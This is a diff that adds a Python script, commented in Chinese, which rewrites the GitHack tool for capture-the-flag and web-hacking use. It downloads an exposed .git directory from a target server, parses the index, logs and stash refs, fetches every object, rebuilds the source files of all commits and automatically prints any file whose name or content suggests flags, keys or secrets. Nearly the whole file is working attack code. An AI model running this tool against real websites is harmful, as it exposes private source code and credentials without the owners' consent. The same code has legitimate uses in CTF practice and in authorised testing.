@@ -1,0 +1,335 @@
+#!/usr/bin/env python3
+# githack -- BugScanTeam GitHack 的 Python3 纯净重写（零依赖 stdlib）
+# 用法: githack <URL> [--out 目录] [--cat 路径] [--quiet]
+# 功能: 解析 .git/index + logs/HEAD + stash, 恢复全部历史提交的源码文件, 可直接 cat 出 flag
+# 仓库: /home/a/hackingtools/web/信息泄露/githack
+
+import sys, zlib, os, struct, re, urllib.request, urllib.error, argparse
+
+# ========== 基础函数 ==========
+
+class GitHack:
+    def __init__(self, url, out_dir, quiet=False):
+        self.url = url.rstrip('/')
+        if not self.url.endswith('.git'):
+            self.url += '/.git'
+        self.url += '/'
+        self.out = out_dir
+        self.quiet = quiet
+        self.objects_dir = os.path.join(out_dir, '.git', 'objects')
+        self.seen = set()
+        self.blobs = set()
+        self.commits = []
+        self.all_files = {}  # name -> (sha, source_msg)
+        os.makedirs(self.objects_dir, exist_ok=True)
+
+    def log(self, msg):
+        if not self.quiet:
+            print(msg)
+
+    def fetch(self, rel):
+        try:
+            req = urllib.request.Request(
+                self.url + rel,
+                headers={'User-Agent': 'Mozilla/5.0'}
+            )
+            with urllib.request.urlopen(req, timeout=10) as r:
+                return r.read()
+        except Exception:
+            return None
+
+    def download_object(self, sha):
+        p = os.path.join(self.objects_dir, sha[:2], sha[2:])
+        if os.path.exists(p):
+            return True
+        d = self.fetch('objects/' + sha[:2] + '/' + sha[2:])
+        if d is None or len(d) < 20:
+            return False
+        try:
+            zlib.decompress(d)
+        except Exception:
+            return False
+        os.makedirs(os.path.dirname(p), exist_ok=True)
+        with open(p, 'wb') as f:
+            f.write(d)
+        return True
+
+    def parse_object(self, sha):
+        p = os.path.join(self.objects_dir, sha[:2], sha[2:])
+        if not os.path.exists(p):
+            return None, None, None
+        with open(p, 'rb') as f:
+            raw = zlib.decompress(f.read())
+        nul = raw.index(b'\x00')
+        hdr = raw[:nul].decode()
+        body = raw[nul + 1:]
+        kind, _, size = hdr.partition(' ')
+        return kind, int(size), body
+
+    def scan_tree(self, body):
+        entries = []
+        pos = 0
+        while pos < len(body):
+            sp = body.index(b' ', pos)
+            mode = body[pos:sp].decode()
+            pos = sp + 1
+            nul = body.index(b'\x00', pos)
+            name = body[pos:nul].decode('utf-8', 'replace')
+            pos = nul + 1
+            sha = body[pos:pos + 20].hex()
+            pos += 20
+            entries.append((name, sha, mode))
+        return entries
+
+    # ========== 步骤 1: 下载 index ==========
+
+    def step_index(self):
+        idx = self.fetch('index')
+        if idx and idx[:4] == b'DIRC':
+            _, ver, count = struct.unpack('>4sII', idx[:12])
+            pos = 12
+            for i in range(count):
+                if pos + 62 > len(idx):
+                    break
+                e = idx[pos:pos + 62]
+                sha = e[40:60].hex()
+                flags, = struct.unpack('>H', e[60:62])
+                plen = flags & 0xFFF
+                ext = bool(flags & 0x4000)
+                pos += 62
+                if ext and pos + 8 <= len(idx):
+                    pos += 8
+                if pos + plen > len(idx):
+                    break
+                name = idx[pos:pos + plen].decode('utf-8', 'replace')
+                pos += plen
+                pos += (8 - ((pos - 12) % 8)) % 8
+                self.blobs.add(sha)
+            self.log(f'[*] index: {count} 条目, {len(self.blobs)} 对象')
+        else:
+            self.log('[!] index 不可用')
+
+    # ========== 步骤 2: 日志 + stash ==========
+
+    def step_logs(self):
+        log_data = self.fetch('logs/HEAD')
+        if log_data:
+            for line in log_data.decode('utf-8', 'replace').splitlines():
+                parts = line.split()
+                if len(parts) >= 2 and re.fullmatch(r'[0-9a-f]{40}', parts[1]):
+                    sha = parts[1]
+                    msg = ' '.join(parts[6:])
+                    self.commits.append((sha, msg))
+            self.log(f'[*] 日志: {len(self.commits)} 次提交')
+
+        # stash
+        stash_found = 0
+        ref_stash = self.fetch('refs/stash')
+        if ref_stash and re.fullmatch(r'[0-9a-f]{40}', ref_stash.decode().strip()):
+            sha = ref_stash.decode().strip()
+            self.commits.append((sha, 'stash: (refs/stash)'))
+            stash_found += 1
+
+        stash_log = self.fetch('logs/refs/stash')
+        if stash_log:
+            for line in stash_log.decode('utf-8', 'replace').splitlines():
+                parts = line.split()
+                if len(parts) >= 2 and re.fullmatch(r'[0-9a-f]{40}', parts[1]):
+                    sha = parts[1]
+                    msg = ' '.join(parts[6:])
+                    self.commits.append((sha, 'stash: ' + msg))
+                    stash_found += 1
+
+        if stash_found:
+            self.log(f'[*] stash: {stash_found} 条')
+
+        # 无日志时从 HEAD ref 获取
+        if not self.commits:
+            head = self.fetch('HEAD')
+            if head and head.startswith(b'ref:'):
+                ref = head.decode().split('ref:')[1].strip()
+                d = self.fetch(ref)
+                if d and re.fullmatch(r'[0-9a-f]{40}', d.decode().strip()):
+                    self.commits.append((d.decode().strip(), 'HEAD'))
+            elif head and re.fullmatch(r'[0-9a-f]{40}', head.decode().strip()):
+                self.commits.append((head.decode().strip(), 'HEAD'))
+
+    # ========== 步骤 3: BFS 下载对象 ==========
+
+    def step_download(self):
+        stack = [c[0] for c in self.commits]
+        for b in list(self.blobs):
+            if b not in self.seen:
+                stack.append(b)
+
+        count = 0
+        while stack:
+            sha = stack.pop()
+            if sha in self.seen:
+                continue
+            self.seen.add(sha)
+            if not self.download_object(sha):
+                continue
+            count += 1
+            kind, size, body = self.parse_object(sha)
+            if kind == 'commit':
+                for m in re.finditer(rb'^(parent|tree) ([0-9a-f]{40})', body, re.M):
+                    stack.append(m.group(2).decode())
+            elif kind == 'tree':
+                for name, s, mode in self.scan_tree(body):
+                    stack.append(s)
+                    if mode != '40000':
+                        self.blobs.add(s)
+        self.log(f'[*] 下载对象: {count}')
+
+    # ========== 步骤 4: 按 commit 恢复文件 ==========
+
+    def resolve_tree(self, sha, path=''):
+        files = {}
+        kind, size, body = self.parse_object(sha)
+        if kind != 'tree':
+            return files
+        for name, s, mode in self.scan_tree(body):
+            full = path + name
+            if mode == '40000':
+                files.update(self.resolve_tree(s, full + '/'))
+            else:
+                files[full] = s
+        return files
+
+    def step_recover(self):
+        for sha, msg in self.commits:
+            kind, size, body = self.parse_object(sha)
+            if kind != 'commit':
+                continue
+            m = re.search(rb'(^|\n)tree ([0-9a-f]{40})', body)
+            if not m:
+                continue
+            tree_sha = m.group(2).decode()
+            try:
+                files = self.resolve_tree(tree_sha)
+            except Exception:
+                continue
+            for name, s in files.items():
+                if name not in self.all_files:
+                    self.all_files[name] = (s, msg)
+                elif msg.startswith('stash:'):
+                    self.all_files[name] = (s, msg)
+
+        self.log(f'[+] 恢复文件: {len(self.all_files)} 个')
+
+        os.makedirs(self.out, exist_ok=True)
+        count = 0
+        for name in sorted(self.all_files):
+            sha, msg = self.all_files[name]
+            p = os.path.join(self.objects_dir, sha[:2], sha[2:])
+            if not os.path.exists(p):
+                continue
+            with open(p, 'rb') as f:
+                raw = zlib.decompress(f.read())
+            nul = raw.index(b'\x00')
+            hdr = raw[:nul].decode()
+            body = raw[nul + 1:]
+            content = body
+            dest = os.path.join(self.out, name)
+            os.makedirs(os.path.dirname(dest) or self.out, exist_ok=True)
+            with open(dest, 'wb') as f:
+                f.write(content)
+            count += 1
+
+        self.log(f'[+] 写出文件: {count} 个 -> {self.out}/')
+
+    # ========== 步骤 5: 提交历史 + 自动 cat ==========
+
+    def step_summary(self):
+        self.log('\n[+] 提交历史:')
+        for sha, msg in self.commits:
+            self.log(f'    {sha[:7]}  {msg}')
+        if not self.commits:
+            self.log('    (无日志)')
+
+        self.log('\n[+] 恢复文件清单:')
+        for name in sorted(self.all_files):
+            sha, msg = self.all_files[name]
+            self.log(f'    {name}  ({sha[:7]})')
+
+    def auto_cat_flag(self):
+        shown = set()
+        for name in sorted(self.all_files):
+            name_hit = bool(re.search(r'flag|key|secret|ctf', name, re.I))
+            p = os.path.join(self.out, name)
+            content = None
+            if os.path.exists(p):
+                with open(p, 'rb') as f:
+                    content = f.read()
+            if not name_hit and content:
+                text = content.decode('utf-8', 'replace')
+                name_hit = any('flag' in l.lower() or 'ctfhub{' in l
+                               for l in text.splitlines()[:200])
+            if name_hit and p not in shown:
+                shown.add(p)
+                print(f'\n[FLAG] {name}:')
+                if content:
+                    print(content.decode('utf-8', 'replace').strip())
+
+    def cat_file(self, rel_path):
+        p = os.path.join(self.out, rel_path)
+        if os.path.exists(p):
+            with open(p, 'rb') as f:
+                print(f.read().decode('utf-8', 'replace').strip())
+        else:
+            print(f'[!] 文件不存在: {rel_path}', file=sys.stderr)
+            sys.exit(1)
+
+    def run(self):
+        self.log(f'[*] 目标: {self.url}')
+        self.step_index()
+        self.step_logs()
+        self.step_download()
+        self.step_recover()
+        self.step_summary()
+        self.auto_cat_flag()
+
+
+# ========== 入口 ==========
+
+if __name__ == '__main__':
+    if len(sys.argv) < 2 or sys.argv[1] in ('-h', '--help'):
+        print('''githack -- BugScanTeam GitHack 的 Python3 纯净重写（零依赖 stdlib）
+
+用法:
+  githack <URL>                     恢复 .git 泄露, 自动 cat 出 flag* 文件
+  githack <URL> --out 目录          指定输出目录（默认 githack_<host>/）
+  githack <URL> --cat 相对路径      恢复后直接打印指定文件内容
+
+示例:
+  githack http://目标/.git
+  githack http://目标/ --out restore
+  githack http://目标/ --cat .git/index''')
+        sys.exit(0)
+
+    url = sys.argv[1]
+    out_dir = None
+    cat_path = None
+    quiet = False
+    i = 2
+    while i < len(sys.argv):
+        if sys.argv[i] == '--out' and i + 1 < len(sys.argv):
+            out_dir = sys.argv[i + 1]; i += 2
+        elif sys.argv[i] == '--cat' and i + 1 < len(sys.argv):
+            cat_path = sys.argv[i + 1]; i += 2
+        elif sys.argv[i] in ('-q', '--quiet'):
+            quiet = True; i += 1
+        else:
+            print(f'[!] 未知选项: {sys.argv[i]}', file=sys.stderr); sys.exit(1)
+
+    if out_dir is None:
+        host = url.rstrip('/').replace('https://', '').replace('http://', '')
+        host = host.replace('/', '_').replace(':', '_')
+        out_dir = f'githack_{host}'
+
+    gh = GitHack(url, out_dir, quiet)
+    gh.run()
+
+    if cat_path:
+        gh.cat_file(cat_path)
